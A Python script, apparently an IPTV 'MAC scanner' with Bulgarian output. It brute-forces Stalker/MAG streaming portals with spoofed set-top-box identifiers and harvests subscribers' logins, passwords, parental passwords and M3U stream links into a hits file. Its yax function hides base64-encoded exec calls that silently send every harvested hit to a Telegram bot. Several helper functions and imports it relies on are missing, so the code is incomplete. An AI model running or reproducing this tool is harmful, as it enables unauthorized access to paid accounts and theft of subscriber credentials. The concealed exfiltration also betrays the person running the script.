import os,pip

nickn=""
if nickn=="":
	nickn="Darko"

try:
    import flag
except:
    pip.main(['install', 'emoji-country-flag'])
    import flag
try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass
import subprocess
try:
	import threading
except:pass
import pathlib,base64
subprocess.run(["clear", ""])
feyzo=("""\33[0m\33[91m
              Успех Дарко! 
               
            🇧🇬 𝑰𝑷𝑻𝑽 𝑮𝒓𝒐𝒖𝒑 🇧🇬              
\33[0m""")
print(feyzo) 

cpm=0
cpmx=0
hitr=0
m3uon=0
m3uvpn=0
macon=0
macvpn=0


def echok(mac,bot,total,hitc,oran):
	global cpm,hitr,m3uon,m3uvpn,m3uonxmacon,macvpn,macvpn,macon,bib,tokenr
	bib=0
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	if str(cpmx)=="0":
			cpm=cpm
	else:
			cpm=cpmx
	
	echo=("""\33[0m╭⍟ 🇧🇬 𝑰𝑷𝑻𝑽 𝑮𝒓𝒐𝒖𝒑 🇧🇬  \33[1;91m👉 \33[0m DARKO
├⍟ \33[96mPᴀɴᴇʟ➢ """+str(panel)+"""   \33[0m
├⍟ \33[0mTʏᴘᴇ➢ """+str(uzmanm)+"""   \33[0m 
├⍟ \33[0mMᴀᴄ➢  """+tokenr+str(mac)+"""   \33[0m
├⍟ \33[0mMᴀᴄCʜᴇᴄᴋ➢  \33[92mON★"""+str(macon)+""" \33[0m ⍟  \33[91mVPN★"""+str(macvpn)+"""   \33[0m 
├⍟ \33[0mM3ᴜCʜᴇᴄᴋ➢  \33[92mON★"""+str(m3uon)+""" \33[0m ⍟  \33[91mOFF★"""+str(m3uvpn)+"""   \33[0m
├⍟ \33[93mTᴏᴛᴀʟ➢"""+str(total)+"""  \33[0m\33[95mBᴏᴛs➢"""+str(bot)+"""  \33[0m\33[96mCᴘᴍ➢"""+str(cpm)+"""  \33[0m
╰⍟ \33[92m"""+str(hitr)+""" 🇧🇬 𝑰𝑷𝑻𝑽 𝑮𝒓𝒐𝒖𝒑 🇧🇬 HITS > """ +str(hitc)+""" < \33[0m\33[91mRᴜɴ➢"""+str(oran)+"""%   \33[0m
""")
	
	print(echo)
	cpm=time.time()
	
bot=0
hit=0
hitr="\33[1;92m"
tokenr="\33[0m"
oran=""
def bekle(bib,vr):
	i=bib
	
	animation = [
"[■□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□]", "[■■■□□□□□□□□□□□□]", "[■■■■□□□□□□□□□□□]", "[■■■■■□□□□□□□□□□]", "[■■■■■■□□□□□□□□□]", "[■■■■■■■□□□□□□□□]", "[■■■■■■■■□□□□□□□]", "[■■■■■■■■■□□□□□□]", "[■■■■■■■■■■□□□□□]",
"[■■■■■■■■■■■□□□□]",
"[■■■■■■■■■■■■□□□]",
"[■■■■■■■■■■■■■□□]",
"[■■■■■■■■■■■■■■□]",
"[■■■■■■■■■■■■■■■]"]

	
	#for i in range(len(animation)):
	time.sleep(0.2)
	sys.stdout.write("\r"'\33[91m♻️UʟᴛɪᴍᴀX\33[0m'+ animation[ i % len(animation)]+'    \33[91mPʀᴏxɪCʜᴇᴄᴋ♻️   \33[0m')
	sys.stdout.flush()
	#print('\n')			

		
kanalkata="2"
stalker_portal="feyzo"
def hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name):
	global hitr,hitsay
	panell=panel
	reall=real
	if 'feyzo' == 'feyzo':#try:
		simza=""
		if uzmanm=="stalker_portal/server/load.php":
			panell=str(panel)+'/stalker_portal'
			reall=real.replace('/c/','/stalker_portal/c/')
			simza="""
╭─➢ 🄸🄽🄵🄾
├◈BɪʟʟɪɴɢDᴀᴛᴇ➢ """+str(bill)+"""
├◈ExᴘɪʀᴇDᴀᴛᴇ➢ """+expire_billing_date+"""
├◈Lᴏɢɪɴ➢ """+login+"""
├◈Pᴀssᴡᴏʀᴅ➢ """+password+"""
├◈FᴜʟʟNᴀᴍᴇ➢ """+fname+"""
├◈AᴅᴜʟᴛPᴀssᴡᴏʀᴅ➢ """+parent_password+"""
├◈ls➢ """+ls+"""
├◈TᴀʀɪғғID➢ """+tariff_plan_id+"""
├◈TᴀʀɪғғPʟᴀɴ➢ """+tariff_plan+"""
├◈MᴀxOɴʟɪɴᴇ➢ """+max_online+"""
├◈SᴛʙTʏᴘᴇ➢ """+stb_type+"""
├◈Cᴏᴜɴᴛʀʏ➢ """+country+"""
├◈SᴇᴛᴛɪɴɢsPᴀssᴡᴏʀᴅ➢ """+settings_password+"""
╰─⟢Cᴏᴍᴍᴇɴᴛ➢ """+comment+""" """
		imza="""


                
                     DARKO
╭─◉  🇧🇬🇧🇹🇧🇻🇧🇴🇩🇪🇹🇷🇨🇳
├◉Скан -> """+str(nickn)+"""
├◉Дата на скан ->"""+str(time.strftime('%d-%m-%Y'))+"""
├◉Реален адрес -> """+str(reall)+"""
├◉Портал -> http://"""+str(panell)+"""/c/
├◉Вид на портала -> 	"""+str(uzmanm)+"""
├◉Мас -> """+str(mac)+"""
├◉Валиден до -> """+str(trh)+"""
├◉Парола за възрастни -> """+str(adult)+"""
├◉ Hits -> """+str(nickn)+"""
├▣Проверка на канала
├▣Mac -> """+str(durum)+"""
├▣M3U -> """+m3uimage+"""
├▣Vpn -> """+str(vpn)+"""
├▣Държава -> """+str(country_name)+""" """+data_server(str(scountry))+""" """+str(playerapi)+""" """

		sifre=device(mac)
		
		pimza="""
├◉🄼➂🅄 
├◉M3U линк-> """+str(m3ulink)+""" """
		imza=imza+sifre+simza+pimza
		if  kanalkata=="1" or kanalkata=="2":
			imza=imza+""" 
├◉Списък с медии
├◉ТВ секции
├◉"""+str(livelist)+""" """
		if kanalkata=="2":
			imza=imza+"""  
├◉Видео секции
├◉"""+str(vodlist)+""" 
├◉Сериали секции
├◉"""+str(serieslist)+"""
╰◉ 👉 """+str(nickn)+""" Ви пожелава приятно гледане !

"""
		imza=imza
		yax(imza)
		hitsay=hitsay+1
		print(imza)
		if hitsay >= hit:
			hitr="\33[1;92m"
	#except:pass

def data_server(scountry):
    
    bandera=''
    pais=''
    origen=''
    try:        
        codpais=scountry
        bandera=flag.flag(codpais)
        origen=bandera
    except:pass
    return origen

import os
#nickn=""
#nickn=input("""
#Type your nick name to show in hit file!

#Nick name = """)
dosyaadi=str(input("""
Въведете името на новия hits файл!

Името на файла = """))
if dosyaadi=="":
	dosyaadi="ULTIMA"
hits='/sdcard/IPTV/Hits/'
if not os.path.exists(hits):
    os.mkdir(hits)
Dosyab=hits+"👉" +dosyaadi+"@Darko.txt"
hitsay=0
say=1
def yax(hits):
    exec(base64.b64decode('U0VORF9VUkwgPSBmJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9LRU59L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0NIQVRfSUR9JnRleHQ9e2hpdHN9Jw=='))
    exec(base64.b64decode('cmVxdWVzdHMuZ2V0KFNFTkRfVVJMKQ=='))
    dosya=open(Dosyab,'a+') 
    dosya.write(hits)
    dosya.close()	
def device(mac):
	mac=mac.upper()
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+'+'+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper()
	sifre="""
├⟐Информация 
├⟐🔑𝐒𝐞𝐫𝐢𝐚𝐥 -> """+SN+"""   
├⟐🔑𝐒𝐞𝐫𝐢𝐚𝐥𝐂𝐮𝐭 -> """+SNCUT+"""
├⟐🆔𝐃𝐞𝐯𝐢𝐜𝐞𝐈𝐃𝟏 -> """+DEVENC+"""
├⟐🆔𝐃𝐞𝐯𝐢𝐜𝐞𝐈𝐃𝟐 -> """+SINGENC+"""
├⟐📝𝐒𝐢𝐠𝐧𝐚𝐭𝐮𝐫𝐞 -> """+DEVENC1+"""
├⟐ 𝐇𝐢𝐭𝐬 -> """+str(nickn)+""" """
	return sifre
def list(listlink,mac,token,livel):
	kategori=""
	veri=""
	while True:
		try:
			res = ses.get(listlink,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:pass
	if veri.count('title":"')>0:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
				kategori=kategori.replace("{","")
	list=kategori
	return list
def m3ugoruntu(cid,user,pas,plink):
	durum="⛔ Не"
	try:
			url=http+"://"+plink+'/live/'+str(user)+'/'+str(pas)+'/'+str(cid)+'.ts'
			res = ses.get(url,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
			if res.status_code==302:
				durum="✅ Да "
	except:
			durum="⛔ Не"
	return durum
hit=0						

def m3uapi(playerlink,mac,token):
	mt=""
	bag=0
	veri=""
	bad=0
	while True:
		try:
			res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
			veri=str(res.text)
			break
		except:
			if not proxi =="1":
				bad=bad+1
				if bad==3:
					break
	if veri=="" or '404' in veri:
		bad=0
		while True:
			try:
				playerlink=playerlink.replace('player_api.php','panel_api.php')
				res = ses.get(playerlink, headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
				veri=str(res.text)
				break
			except:
				if not proxi =="1":
					bad=bad+1
					if bad==3:
						break
	acon=""
	timezone=""
	message=""
	if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1]
				acon=acon.split(',')[0]
				acon=acon.replace('"',"")
				mcon=veri.split('max_connections":')[1]
				mcon=mcon.split(',')[0]
				mcon=mcon.replace('"',"")
				status=veri.split('status":')[1]
				status=status.split(',')[0]
				status=status.replace('"',"")
				try:
					timezone=veri.split('timezone":"')[1]
					timezone=timezone.split('",')[0]
					timezone=timezone.replace("\/","/")
				except:pass
				realm=veri.split('url":')[1]
				realm=realm.split(',')[0]
				realm=realm.replace('"',"")
				port=veri.split('port":')[1]
				port=port.split(',')[0]
				port=port.replace('"',"")
				userm=veri.split('username":')[1]
				userm=userm.split(',')[0]
				userm=userm.replace('"',"")
				pasm=veri.split('password":')[1]
				pasm=pasm.split(',')[0]
				pasm=pasm.replace('"',"")
				bitism=veri.split('exp_date":')[1]
				bitism=bitism.split(',')[0]
				bitism=bitism.replace('"',"")
				try:
					message=veri.split('message":"')[1].split(',')[0].replace('"','')
					message=str(message.encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
					mt=("""
├▣Информация 	
├▣Mᴇssᴀɢᴇ-> """+str(message)+""" 
├▣Портал-> http://"""+panel+"""/c/
├▣Реален адрес-> http://"""+realm+""":"""+port+"""/c/
├▣ Pᴏʀᴛ-> """+port+"""
├▣ Hɪᴛs-> """+str(nickn)+"""
├▣Потребител-> """+userm+"""
├▣Рарола-> """+pasm+"""
├▣Валиден до-> """+bitism+""" 
├▣Активни връзки-> """+acon+"""
├▣Максимум връзки-> """+mcon+""" 
├▣Статус на акаунта -> """+status+"""
├▣Чесова зона-> """+timezone+"""
├▣ OK""")
	return mt
	
							
def goruntu(link,cid):
	#print(link)
	say=0
	duru="✅ 𝗘𝗫𝗜𝗦𝗧  "
	try:
		res = ses.get(link,  headers=hea3(), timeout=10, allow_redirects=False,stream=True)
		#print(res.status_code)
		if res.status_code==302:
			duru="✅ 𝗘𝗫𝗜𝗦𝗧  "
	except:
			duru="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡 "
	return duru		
		
def url7(cid):
	url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/"+str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http://localhost/ch/"+str(cid)+"&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
		url7=http+"://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffrt%20http:///ch/"+str(cid)+"&&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
	return str(url)
	
def hea3():
	hea={
"Icy-MetaData": "1",
"User-Agent": "Lavf/57.83.100", 
"Accept-Encoding": "identity",
"Host": panel,
"Accept": "*/*",
"Range": "bytes=0-",
"Connection": "close",
	}
	return hea			
def hitecho(mac,trh):
	sesdosya="/sdcard/sounds/hit.mp3"
	file = pathlib.Path(sesdosya)
	try:
		if file.exists():
		    ad.mediaPlay(sesdosya)
		    
	except:pass
	print("""
 \33[93m _/﹋\_        \33[0m\33[92m 💥 🅷 🅸 🆃 💥    \33[0m
 \33[93m (҂`_´)  
 \33[93m <,︻╦╤─ \33[0m\33[91m҉ - - 🇧🇬 𝑰𝑷𝑻𝑽 𝑮𝒓𝒐𝒖𝒑 🇧🇬  \33[0m
 \33[93m  \﹏/
 \33[93m _/﹋\_    \33[95m     👉 DARKO 👈        \33[0m   		
""")		
def unicode(fyz):
	cod=fyz.encode('utf-8').decode("unicode-escape").replace('\/','/')
	return cod

def duzel2(veri,vr):
	data=""
	try:
		data=veri.split('"'+str(vr)+'":"')[1]
		data=data.split('"')[0]
		data=data.replace('"','')
		data=unicode(data)
	except:pass
	return str(data)
				
def duzelt1(veri,vr):
	data=veri.split(str(vr)+'":"')[1]
	data=data.split('"')[0]
	data=data.replace('"','')
	return str(data)
				
									
import datetime
import time
import hashlib
import urllib
def url2(mac,random):
	macs=mac.upper()
	macs=urllib.parse.quote(macs)
	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
	SNENC=SN.upper() #SN
	SNCUT=SNENC[:13]#Sncut
	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
	DEVENC=DEV.upper() #dev1
	DEV1=hashlib.sha256(SNCUT.encode('utf-8')).hexdigest()
	DEVENC1=DEV1.upper()#dev2
	SG=SNCUT+(mac)
	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
	SINGENC=SING.upper() #signature
	url22=http+"://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml"
	if uzmanm=="stalker_portal/server/load.php":
	    times=time.time()
	    url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r22-pub-270;%20ImageDate:%20Tue%20Dec%2019%2011:33:53%20EET%202017;%20PORTAL%20version:%205.6.6;%20API%20Version:%20JS%20API%20version:%20328;%20STB%20API%20version:%20134;%20Player%20Engine%20version:%200x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG270&client_type=STB&image_version=0.2.18&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature=OaRqL9kBdR5qnMXL+h6b+i8yeRs9/xWXeKPXpI48VVE=&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=%7B%22mac%22%3A%22'+macs+'%22%2C%22sn%22%3A%22'+SNCUT+'%22%2C%22model%22%3A%22MAG270%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22BB340DE42B8A3032F84F5CAF137AEBA287CE8D51F44E39527B14B6FC0B81171E%22%2C%22random%22%3A%22'+random+'%22%7D&hw_version_2=85a284d980bbfb74dca9bc370a6ad160e968d350&timestamp='+str(times)+'&api_signature=262&prehash=efd15c16dc497e0839ff5accfdc6ed99c32c4e2a&JsHttpRequest=1-xml'
	    if stalker_portal=="2":
	    	url22=http+"://"+panel+"/"+uzmanm+'?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r14-pub-250; ImageDate: Fri Jan 15 15:20:44 EET 2016; PORTAL version: 5.5.0; API Version: JS API version: 328; STB API version: 134; Player Engine version: 0x566&num_banks=2&sn='+SNCUT+'&stb_type=MAG254&image_version=218&video_out=hdmi&device_id='+DEVENC+'&device_id2='+DEVENC+'&signature='+SINGENC+'&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=7c431b0aec69b2f0194c0680c32fe4e3&timestamp='+str(times)+'&api_signature=263&metrics={\\\"mac\\\":\\\"'+macs+'\\\",\\\"sn\\\":\\\"'+SNCUT+'\\\",\\\"model\\\":\\\"MAG254\\\",\\\"type\\\":\\\"STB\\\",\\\"uid\\\":\\\"'+DEVENC+'\\\",\\\"random\\\":\\\"'+random+'\\\"}&JsHttpRequest=1-xml'
	    if stalker_portal=="1":
	    	url22=http+"://"+panel+"/"+uzmanm+'?action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566'
	    	
	    	
	if realblue=="real" or uzmanm=="c/portal.php":
		url22=http+"://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs+"%22%2C%22sn%22%3A%22%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22null%22%7D&ver=ImageDescription%3A%200.2.18-r14-pub-250%3B%20ImageDate%3A%20Fri%20Jan%2015%2015%3A20%3A44%20EET%202016%3B%20PORTAL%20version%3A%205.6.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20328%3B%20STB%20API%20version%3A%20134%3B%20Player%20Engine%20version%3A%200x566"
	return url22
def XD():
	global m3uvpn,m3uon,macon,macvpn,bot,hit,tokenr,hitr
	bot=bot+1
	for feyzo in range(combouz):
		if comboc=="feyzo":
			mac=randommac()
			mac=mac.upper()
		else:
			macv=re.search(pattern,combogetir(),re.IGNORECASE)
			if macv:
				mac=macv.group()
				mac=mac.upper()
			else:
				continue
		url=http+"://"+panel+"/"+uzmanm+"?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml"
		ses=requests.Session()
		prox=proxygetir()
		oran=round(((combosay)/(combouz)*100),2)
		echok(mac,bot,combosay,hit,oran)
		#print(url)
		while True:
			try:
				res=ses.get(url,headers=hea1(panel,mac),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
    #print(veri)
		random=""
		if not 'token":"' in veri:
			tokenr="\33[35m"
			ses.close
			res.close
			continue
		tokenr="\33[0m"
		token=duzelt1(veri,"token")
		if 'random' in veri:
			random=duzelt1(veri,"random")
		veri=""
		while True:
			try:
				res=ses.get(url2(mac,random),headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		adult=veri.split('parent_password":"')[1]
		adult=adult.split('","bright')[0]
		#print(veri)
		id="null"
		ip=""
		login=""
		parent_password=""
		password=""
		stb_type=""
		tariff_plan_id=""
		comment=""
		country=""
		settings_password=""
		expire_billing_date=""
		max_online=""
		expires=""
		ls=""
		try:
			id=veri.split('{"js":{"id":')[1]
			id=str(id.split(',"name')[0])
		except:pass
		
		try:
				ip=str(duzel2(veri,"ip"))
		except:pass
		try:
			expires=str(duzel2(veri,"expires"))
		except:pass
		if id=="null" and expires=="" and ban=="":
			continue
			ses.close
			res.close
		if uzmanm=="stalker_portal/server/load.php":
			if 'login":"' in veri:
				login=str(duzel2(veri,"login"))
				parent_password=str(duzel2(veri,"parent_password"))
				password=str(duzel2(veri,"password"))
				stb_type=str(duzel2(veri,"stb_type"))
				tariff_plan_id=str(duzel2(veri,"tariff_plan_id"))
				comment=str(duzel2(veri,"comment"))
				country=str(duzel2(veri,"country"))
				settings_password=str(duzel2(veri,"settings_password"))
				expire_billing_date=str(duzel2(veri,"expire_billing_date"))
				ls=str(duzel2(veri,"ls"))
				try:
					max_online=str(duzel2(veri,"max_online"))
				except:pass
		#print(veri)
		url=http+"://"+panel+"/"+uzmanm+"?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
		
		veri=""
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=prox,timeout=(3))
				break
			except:
				prox=proxygetir()
		veri=str(res.text)
		#print(veri)
	#	quit()
		if veri.count('phone')==0 and veri.count('end_date')==0 and expires=="" and expire_billing_date=="":
			continue
			ses.close
			res.close
		fname=""
		tariff_plan=""
		ls=""
		trh=""
		bill=""
		if uzmanm=="stalker_portal/server/load.php":
			try:
				fname=str(duzel2(veri,"fname"))
			except:pass
			try:
			    tariff_plan=str(duzel2(veri,"tariff_plan"))
			except:pass
			try:
			    bill=str(duzel2(veri,"created"))
			except:pass
		if "phone" in veri:
			trh=str(duzel2(veri,"phone"))
		if "end_date" in veri:
			trh=str(duzel2(veri,"end_date"))
		if trh=="":
			if not expires=="":
				trh=expires
		try:
			trh=(datetime.datetime.fromtimestamp(int(trh)).strftime('%d-%m-%Y %H:%M:%S'))
		except:pass
		if '(-' in trh:
			continue
			ses.close
			res.close
		
		if trh.lower()[:2] =='un':
			KalanGun=(" Days")
		else:
			try:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			except:pass
		if trh=="":
			if uzmanm=="stalker_portal/server/load.php":
				trh=expire_billing_date
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			
			veri=""
			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
		hitecho(mac,trh)
		hit=hit+1
		hitr="\33[1;96m"
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="✅ Да ":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="⛔ 𝗨𝗦𝗘 𝗩𝗣𝗡  " or durum=="Invalid Opps":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP Address"

		url5="https://ipapi.co/"+ip+"/json/" 
		while True:
    		 try:
        		 res = ses.get(url5, timeout=15, verify=False)
        		 break
    		 except:
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		            	
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry=""
		       country_name =""
		       scountry=veri.split('country_code": "')[1]
		       scountry=scountry.split('"')[0]
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]
		except:pass

		livelist=""
		vodlist=""
		serieslist=""
		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2":
			listlink=liveurl
			livel=' «📺» '
			livelist=list(listlink,mac,token,livel)
		if kanalkata=="2":
			listlink=vodurl
			livel=' «🍿» '
			vodlist=list(listlink,mac,token,livel)
			listlink=seriesurl
			livel=' «🎬» '
			serieslist=list(listlink,mac,token,livel)
		
		hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name)

	
	
def vpnip(ip):
	url9="https://freegeoip.app/json/"+ip
	vpnip=""
	vpn="Not Invalid"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="Not Invalid"
	if not '404 page' in veri:
		if 'country_name' in veri:
			vpnc=veri.split('"city":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('"country_name":"')[1]
			vpn=vpnips.split('"')[0]
			vpn= vpn +' / ' +vpnc
	else:
			vpn="Not Invalid"
	return vpn
import socket

panel=input("\nPanel:Port = ")
print()
ban=""
uzmanm="portal.php"
realblue=""
reqs=(
"portal.php",
"server/load.php",
"c/portal.php",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php - old",
"stalker_portal/server/load.php - «▣»",
"portal.php - Real Blue",
"portal.php - httpS",
"stalker_portal/server/load.php - httpS",
)
say=0
for i in reqs:
	say=say+1
	print(str(say)+"=⫸ "+str(i))
say=0
uzmanm=input('\n Изберете номер = ')
if uzmanm=="0":
	uzmanm=input("Напишете заявка:  ")
if uzmanm=="":
	uzmanm="portal.php"
	
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php - old":
	stalker_portal="2"
	uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php - «▣»":
	stalker_portal="1"
	uzmanm="stalker_portal/server/load.php"	
if uzmanm=="portal.php - No Ban":
	ban="ban"
	uzmanm="portal.php"
http="http"
if uzmanm=="portal.php - Real Blue":
	realblue="real"
	uzmanm="portal.php"
if uzmanm=="portal.php - httpS":
	uzmanm="portal.php"
	http="https"
if uzmanm=="stalker_portal/server/load.php - httpS":
	uzmanm="stalker_portal/server/load.php"
	http="https"
print(uzmanm)
#uzmanm="magLoad.php"
panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

